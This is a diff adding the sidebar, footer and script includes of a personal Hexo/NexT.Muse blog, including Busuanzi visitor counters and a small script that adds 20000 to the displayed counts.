+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="bcYng"
+      src="https://raw.githubusercontent.com/bcYng-w/images/main/touxaing.png">
+  <p class="site-author-name" itemprop="name">bcYng</p>
+  <div class="site-description" itemprop="description">前程似锦</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/bcYng-w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;bcYng-w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=2384417651@qq.com" title="E-Mail → https:&#x2F;&#x2F;mail.qq.com&#x2F;cgi-bin&#x2F;qm_share?t&#x3D;qm_mailme&amp;email&#x3D;2384417651@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-2-14 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bcYng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共15.8k字</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
